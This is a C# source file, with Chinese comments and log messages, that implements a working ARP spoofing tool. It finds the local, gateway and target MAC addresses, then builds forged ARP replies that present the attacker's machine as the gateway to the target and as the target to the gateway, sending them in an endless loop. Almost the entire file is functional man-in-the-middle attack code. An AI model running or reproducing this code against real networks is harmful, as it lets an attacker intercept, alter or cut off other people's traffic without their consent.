using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;
using ArpLookup;

namespace Rt
{

    class ArpSpoofer
    {
        private static PhysicalAddress? gatewayMac;
        private static PhysicalAddress? localMac;
        private static IPAddress? gatewayIp;
        private static IPAddress? targetIp;
        private static LibPcapLiveDevice? selectedDevice; // 使用LibPcapLiveDevice而不是ICaptureDevice

        public static void Start(IPAddress target, IPAddress gateway)
        {
            Console.WriteLine("ArpSpoofer.Start: 开始初始化...");
            targetIp = target;
            gatewayIp = gateway;

            // 选择合适的网络设备
            selectedDevice = SelectProperDevice(gateway);
            if (selectedDevice == null)
            {
                Console.WriteLine("ArpSpoofer.Start: 无法找到合适的网络设备");
                return;
            }
            
            Console.WriteLine("ArpSpoofer.Start: 获取本地MAC地址...");
            localMac = GetLocalMacAddress();
            if (localMac != null)
            {
                Console.WriteLine($"ArpSpoofer.Start: 本地MAC地址: {BitConverter.ToString(localMac.GetAddressBytes()).Replace('-', ':')}");
            }
            
            Console.WriteLine("ArpSpoofer.Start: 获取网关MAC地址...");
            gatewayMac = GetGatewayMacAddress(gateway);
            if (gatewayMac != null)
            {
                Console.WriteLine($"ArpSpoofer.Start: 网关MAC地址: {BitConverter.ToString(gatewayMac.GetAddressBytes()).Replace('-', ':')}");
            }

            if (localMac == null || gatewayMac == null)
            {
                Console.WriteLine("无法获取MAC地址");
                return;
            }

            Console.WriteLine("ArpSpoofer.Start: 启动ARP欺骗线程...");
            var sender = new Thread(ArpLoop);
            sender.Start();
            Console.WriteLine("ArpSpoofer.Start: ARP欺骗线程已启动");
        }

        private static LibPcapLiveDevice? SelectProperDevice(IPAddress gatewayIp)
        {
            Console.WriteLine("SelectProperDevice: 查找合适的网络设备...");
            
            var devices = LibPcapLiveDeviceList.Instance;
            if (devices.Count == 0)
            {
                Console.WriteLine("SelectProperDevice: 没有找到网络设备");
                return null;
            }
            
            // 尝试获取本地接口和IP地址
            var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback);
                
            foreach (var ni in networkInterfaces)
            {
                var ipProps = ni.GetIPProperties();
                var ipAddresses = ipProps.UnicastAddresses
                    .Where(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Select(a => a.Address)
                    .ToList();
                    
                if (ipAddresses.Count > 0)
                {
                    Console.WriteLine($"SelectProperDevice: 接口 {ni.Name} 有IP地址: {string.Join(", ", ipAddresses)}");
                    
                    // 检查该接口的网关
                    var gateways = ipProps.GatewayAddresses
                        .Where(g => g.Address != null)
                        .Select(g => g.Address)
                        .ToList();
                        
                    if (gateways.Contains(gatewayIp))
                    {
                        // 找到匹配网关的接口，查找相应的设备
                        foreach (var device in devices)
                        {
                            try
                            {
                                device.Open();
                                var deviceDescription = device.Description.ToLower();
                                var macString = BitConverter.ToString(ni.GetPhysicalAddress().GetAddressBytes()).Replace("-", ":");
                                
                                Console.WriteLine($"SelectProperDevice: 检查设备 {device.Description}");
                                
                                // 如果描述中包含MAC地址或接口名称，则选择该设备
                                if (deviceDescription.Contains(ni.Name.ToLower()) || 
                                    deviceDescription.Contains(macString.ToLower()))
                                {
                                    Console.WriteLine($"SelectProperDevice: 找到匹配的设备: {device.Description}");
                                    return device;
                                }
                                
                                device.Close();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"SelectProperDevice: 检查设备时出错: {ex.Message}");
                                try { device.Close(); } catch { }
                            }
                        }
                    }
                }
            }
            
            // 如果没有找到完全匹配的设备，使用第一个活动设备
            Console.WriteLine("SelectProperDevice: 未找到完全匹配的设备，使用第一个设备");
            var firstDevice = devices[0];
            try
            {
                firstDevice.Open();
                Console.WriteLine($"SelectProperDevice: 使用设备: {firstDevice.Description}");
                return firstDevice;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"SelectProperDevice: 打开第一个设备时出错: {ex.Message}");
                return null;
            }
        }

        private static PhysicalAddress? GetLocalMacAddress()
        {
            Console.WriteLine("GetLocalMacAddress: 获取本地MAC地址...");
            var localMac = NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(ni => ni.OperationalStatus == OperationalStatus.Up && 
                                      ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)?
                .GetPhysicalAddress();
                
            if (localMac != null)
            {
                Console.WriteLine($"GetLocalMacAddress: 成功获取本地MAC地址: {BitConverter.ToString(localMac.GetAddressBytes()).Replace('-', ':')}");
            }
            else
            {
                Console.WriteLine("GetLocalMacAddress: 无法获取本地MAC地址");
            }
            
            return localMac;
        }

        private static PhysicalAddress? GetGatewayMacAddress(IPAddress gateway)
        {
            Console.WriteLine($"GetGatewayMacAddress: 开始获取网关 {gateway} 的MAC地址...");
            try
            {
                // 使用ArpLookup库获取MAC地址
                try
                {
                    // 先使用Ping确保目标可达
                    Console.WriteLine($"GetGatewayMacAddress: Ping网关 {gateway}...");
                    using (var ping = new Ping())
                    {
                        var reply = ping.Send(gateway, 1000);
                        if (reply?.Status != IPStatus.Success)
                        {
                            Console.WriteLine($"GetGatewayMacAddress: 无法ping通网关 {gateway}");
                        }
                        else
                        {
                            Console.WriteLine($"GetGatewayMacAddress: Ping网关 {gateway} 成功");
                        }
                    }
                    
                    // 使用ArpLookup获取MAC地址
                    Console.WriteLine($"GetGatewayMacAddress: 使用ArpLookup获取网关 {gateway} 的MAC地址...");
                    string? macAddress = ArpLookup.Arp.Lookup(gateway)?.ToString();
                    
                    if (!string.IsNullOrEmpty(macAddress))
                    {
                        Console.WriteLine($"GetGatewayMacAddress: ArpLookup返回的MAC地址: {macAddress}");
                        
                        // 标准化MAC地址格式，移除所有分隔符
                        string macStr = macAddress
                            .Replace("-", "")
                            .Replace(":", "")
                            .ToUpperInvariant();
                            
                        Console.WriteLine($"GetGatewayMacAddress: 标准化后的MAC地址字符串: {macStr}");
                            
                        // 验证MAC地址格式
                        if (macStr.Length == 12 &&
                            System.Text.RegularExpressions.Regex.IsMatch(macStr, "^[0-9A-F]{12}$"))
                        {
                            // 将字符串转换为字节数组
                            byte[] macBytes = new byte[6];
                            for (int i = 0; i < 6; i++)
                            {
                                macBytes[i] = Convert.ToByte(macStr.Substring(i * 2, 2), 16);
                            }
                            
                            PhysicalAddress physicalAddress = new PhysicalAddress(macBytes);
                            Console.WriteLine($"GetGatewayMacAddress: 使用ArpLookup成功获取网关MAC地址: {BitConverter.ToString(physicalAddress.GetAddressBytes()).Replace('-', ':')}");
                            return physicalAddress;
                        }
                        else
                        {
                            Console.WriteLine($"GetGatewayMacAddress: ArpLookup返回的MAC地址格式无效: {macStr}");
                        }
                    }
                    else
                    {
                        Console.WriteLine("GetGatewayMacAddress: ArpLookup返回了空的MAC地址");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"GetGatewayMacAddress: 使用ArpLookup获取MAC地址失败: {ex.Message}");
                }
                
                // 如果ArpLookup失败，则使用备用方法尝试获取MAC地址
                Console.WriteLine("GetGatewayMacAddress: ArpLookup失败，尝试使用备用方法...");
                // 使用ping更新ARP表
                using (var ping = new Ping())
                {
                    var reply = ping.Send(gateway, 1000);
                    if (reply?.Status != IPStatus.Success)
                    {
                        Console.WriteLine($"GetGatewayMacAddress: 无法ping通网关 {gateway}");
                        return null;
                    }
                    Console.WriteLine($"GetGatewayMacAddress: Ping网关 {gateway} 成功");
                }

                // 给系统一些时间来更新ARP表
                Console.WriteLine("GetGatewayMacAddress: 等待ARP表更新...");
                Thread.Sleep(500);

                // 获取ARP表信息
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    Console.WriteLine("GetGatewayMacAddress: 使用Windows ARP命令获取MAC地址...");
                    var process = new System.Diagnostics.Process
                    {
                        StartInfo = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "arp",
                            Arguments = "-a",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };

                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    Console.WriteLine("GetGatewayMacAddress: ARP命令执行完成，开始解析输出...");

                    // 使用更严格的正则表达式来匹配ARP表输出
                    var gatewayString = gateway.ToString();
                    foreach (var line in output.Split('\n'))
                    {
                        if (line.Contains(gatewayString))
                        {
                            Console.WriteLine($"GetGatewayMacAddress: 找到包含网关IP的行: {line}");
                            // 使用更精确的正则表达式来匹配MAC地址
                            var match = System.Text.RegularExpressions.Regex.Match(
                                line,
                                @"(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}",
                                System.Text.RegularExpressions.RegexOptions.IgnoreCase
                            );

                            if (match.Success)
                            {
                                Console.WriteLine($"GetGatewayMacAddress: 匹配到MAC地址: {match.Value}");
                                try
                                {
                                    // 标准化MAC地址格式
                                    string macStr = match.Value
                                        .Replace("-", "")
                                        .Replace(":", "")
                                        .ToUpperInvariant();

                                    Console.WriteLine($"GetGatewayMacAddress: 标准化后的MAC地址字符串: {macStr}");

                                    // 验证MAC地址格式
                                    if (macStr.Length == 12 &&
                                        System.Text.RegularExpressions.Regex.IsMatch(macStr, "^[0-9A-F]{12}$"))
                                    {
                                        // 将字符串转换为字节数组
                                        byte[] macBytes = new byte[6];
                                        for (int i = 0; i < 6; i++)
                                        {
                                            macBytes[i] = Convert.ToByte(macStr.Substring(i * 2, 2), 16);
                                        }
                                        PhysicalAddress physicalAddress = new PhysicalAddress(macBytes);
                                        Console.WriteLine($"GetGatewayMacAddress: 使用ARP命令成功获取网关MAC地址: {BitConverter.ToString(physicalAddress.GetAddressBytes()).Replace('-', ':')}");
                                        return physicalAddress;
                                    }
                                    else
                                    {
                                        Console.WriteLine($"GetGatewayMacAddress: 无效的MAC地址格式: {macStr}");
                                    }
                                }
                                catch (FormatException fEx)
                                {
                                    Console.WriteLine($"GetGatewayMacAddress: MAC地址格式转换失败: {fEx.Message}");
                                    continue;
                                }
                            }
                            else
                            {
                                Console.WriteLine("GetGatewayMacAddress: 在该行中未找到MAC地址");
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("GetGatewayMacAddress: 当前仅支持Windows系统");
                    return null;
                }

                Console.WriteLine($"GetGatewayMacAddress: 未能在ARP表中找到网关 {gateway} 的MAC地址");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"GetGatewayMacAddress: 获取网关MAC地址时发生错误: {ex.Message}");
                return null;
            }
        }

        private static void ArpLoop()
        {
            Console.WriteLine("ArpLoop: 开始初始化ARP欺骗循环...");
            
            if (gatewayMac == null || localMac == null || gatewayIp == null || targetIp == null || selectedDevice == null)
            {
                Console.WriteLine("ArpLoop: 必要的网络信息缺失");
                return;
            }

            Console.WriteLine("ArpLoop: 打开网络设备...");
            try
            {
                if (!selectedDevice.Opened)
                {
                    selectedDevice.Open();
                }
                Console.WriteLine($"ArpLoop: 已打开网络设备: {selectedDevice.Description}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ArpLoop: 打开网络设备失败: {ex.Message}");
                return;
            }

            // 首先尝试获取目标主机的MAC地址
            Console.WriteLine($"ArpLoop: 尝试获取目标 {targetIp} 的MAC地址...");
            PhysicalAddress? targetMac = null;
            
            try
            {
                // 使用ping来尝试获取目标MAC地址
                using (var ping = new Ping())
                {
                    if (targetIp != null)
                    {
                        var reply = ping.Send(targetIp, 1000);
                        Console.WriteLine($"ArpLoop: Ping目标 {targetIp} 结果: {reply?.Status}");
                    }
                }
                
                // 尝试从ArpLookup获取目标MAC
                try
                {
                    string? targetMacStr = null;
                    if (targetIp != null)
                    {
                        targetMacStr = Arp.Lookup(targetIp)?.ToString();
                    }
                    
                    if (!string.IsNullOrEmpty(targetMacStr))
                    {
                        // 标准化MAC地址格式
                        string macStr = targetMacStr
                            .Replace("-", "")
                            .Replace(":", "")
                            .ToUpperInvariant();
                            
                        // 验证MAC地址格式
                        if (macStr.Length == 12 &&
                            System.Text.RegularExpressions.Regex.IsMatch(macStr, "^[0-9A-F]{12}$"))
                        {
                            // 将字符串转换为字节数组
                            byte[] macBytes = new byte[6];
                            for (int i = 0; i < 6; i++)
                            {
                                macBytes[i] = Convert.ToByte(macStr.Substring(i * 2, 2), 16);
                            }
                            targetMac = new PhysicalAddress(macBytes);
                            Console.WriteLine($"ArpLoop: 获取到目标MAC地址: {BitConverter.ToString(targetMac.GetAddressBytes()).Replace('-', ':')}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"ArpLoop: 获取目标MAC地址失败: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ArpLoop: 尝试获取目标MAC地址时出错: {ex.Message}");
            }

            Console.WriteLine("ArpLoop: 构造欺骗网关的ARP包...");
            // 构造欺骗网关的ARP包 - 告诉网关我是目标主机
            var gatewayPacket = BuildArpPacket(
                sourceMac: localMac,
                destMac: gatewayMac,
                senderIp: targetIp ?? IPAddress.Any,
                targetIp: gatewayIp ?? IPAddress.Any);
            Console.WriteLine($"ArpLoop: 欺骗网关的ARP包已构造完成，包大小: {gatewayPacket.Bytes.Length} 字节");

            Console.WriteLine("ArpLoop: 构造欺骗目标的ARP包...");
            // 构造欺骗目标的ARP包 - 告诉目标主机我是网关
            PhysicalAddress destMac;
            if (targetMac != null)
            {
                // 如果获取到了目标MAC，直接发送给目标
                destMac = targetMac;
                Console.WriteLine($"ArpLoop: 使用目标MAC地址: {BitConverter.ToString(destMac.GetAddressBytes()).Replace('-', ':')}");
            }
            else
            {
                // 否则使用广播地址
                byte[] broadcastMacBytes = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
                destMac = new PhysicalAddress(broadcastMacBytes);
                Console.WriteLine($"ArpLoop: 使用广播MAC地址: {BitConverter.ToString(destMac.GetAddressBytes()).Replace('-', ':')}");
            }
            
            var targetPacket = BuildArpPacket(
                sourceMac: localMac,
                destMac: destMac,
                senderIp: gatewayIp ?? IPAddress.Any,
                targetIp: targetIp ?? IPAddress.Any);
            Console.WriteLine($"ArpLoop: 欺骗目标的ARP包已构造完成，包大小: {targetPacket.Bytes.Length} 字节");

            Console.WriteLine("ArpLoop: 开始发送ARP欺骗包...");
            int packetCount = 0;
            while (true)
            {
                try
                {
                    // 发送原始字节而不是包对象
                    selectedDevice.SendPacket(gatewayPacket.Bytes);
                    selectedDevice.SendPacket(targetPacket.Bytes);
                    packetCount += 2;
                    
                    if (packetCount % 10 == 0) // 每发送10个包记录一次日志
                    {
                        Console.WriteLine($"ArpLoop: 已发送 {packetCount} 个ARP欺骗包");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"ArpLoop: 发送ARP包时出错: {ex.Message}");
                    // 尝试重新打开设备
                    try
                    {
                        if (!selectedDevice.Opened)
                        {
                            selectedDevice.Open();
                            Console.WriteLine("ArpLoop: 已重新打开网络设备");
                        }
                    }
                    catch
                    {
                        Console.WriteLine("ArpLoop: 无法重新打开网络设备，停止ARP欺骗");
                        break;
                    }
                }
                
                Thread.Sleep(1000);
            }
        }

        private static EthernetPacket BuildArpPacket(
            PhysicalAddress sourceMac,
            PhysicalAddress destMac,
            IPAddress senderIp,
            IPAddress targetIp)
        {
            Console.WriteLine($"BuildArpPacket: 构造ARP包 - 源MAC: {BitConverter.ToString(sourceMac.GetAddressBytes()).Replace('-', ':')}, " +
                              $"目标MAC: {BitConverter.ToString(destMac.GetAddressBytes()).Replace('-', ':')}, " +
                              $"发送者IP: {senderIp}, 目标IP: {targetIp}");
                              
            var ethernet = new EthernetPacket(
                sourceHardwareAddress: sourceMac,
                destinationHardwareAddress: destMac,
                EthernetType.Arp);

            var arpPacket = new PacketDotNet.ArpPacket(
                PacketDotNet.ArpOperation.Response,
                destMac,
                targetIp,
                sourceMac,
                senderIp);

            ethernet.PayloadPacket = arpPacket;
            
            Console.WriteLine($"BuildArpPacket: ARP包构造完成，总长度: {ethernet.Bytes.Length} 字节");
            return ethernet;
        }
    }
} 